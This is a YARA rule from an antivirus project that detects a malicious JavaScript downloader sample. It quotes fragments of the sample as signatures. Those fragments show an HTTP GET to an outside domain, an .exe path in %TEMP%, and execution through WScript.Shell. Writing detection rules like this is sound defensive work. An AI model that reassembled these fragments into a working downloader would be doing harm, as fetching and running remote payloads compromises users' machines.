rule sig_20160329_97e485357a2861a24260b158b56c76f1 {
  meta:
    description = "datamaliciousorder - file 20160329_97e485357a2861a24260b158b56c76f1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aed2628358c56efb9d71591deda952767ba5adfcf1c30c8682f42bdae817772b"

  strings:
    $s1  = "function Inhnadgzo() {return Ntesqazkrn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"lBIHDeCZoIjJ.exe\";};" fullword ascii
    $s2  = "Qiome[Rzqxihodl](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Bghpfcbxxr](Qvgqzvay() * 11)} while (Qiome[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Ntesqazkrn = function Cjezoso() {return WScript[Hajinfdtpo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Xkcvsf(Vlwuxy, Doyamogntj){return Vlwuxy - Doyamogntj;};" fullword ascii
    $s6  = "function Zxizm(Fkkvolip){Ntesqazkrn[\"Run\"](Fkkvolip, Sgutb, Sgutb);};" fullword ascii
    $s7  = "function Moreyhpm() {return ((Aznvdryco == true) && (Aznvdryco == Bgsyqkmscg)) ? 1 : Sgutb;};" fullword ascii
    $s8  = "return Xkcvsf(Gzxighbs, Fiezblbvq);" fullword ascii
    $s9  = "var Aznvdryco = false;" fullword ascii
    $s10 = "Bgsyqkmscg = true; " fullword ascii
    $s11 = "Aznvdryco = true; " fullword ascii
    $s12 = "var Zhpdxfxu = false;" fullword ascii
    $s13 = "function Dnykoz(){return Foddd;};" fullword ascii
    $s14 = "var Bgsyqkmscg = false;" fullword ascii
    $s15 = "function Ibhldzbvg()" fullword ascii
    $s16 = "function Uioaqmsko(Ffhvwsu) {var Wxgsdzunuk = (1, 2, 3, 4, 5, Ffhvwsu); return Wxgsdzunuk;};" fullword ascii
    $s17 = "var Uoqwq = new this[\"Date\"]();" fullword ascii
    $s18 = "function Ogtwdzhymy(){return Hajinfdtpo;};" fullword ascii
    $s19 = " while (Cuwiurtqm){" fullword ascii
    $s20 = "function Qvgqzvay(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}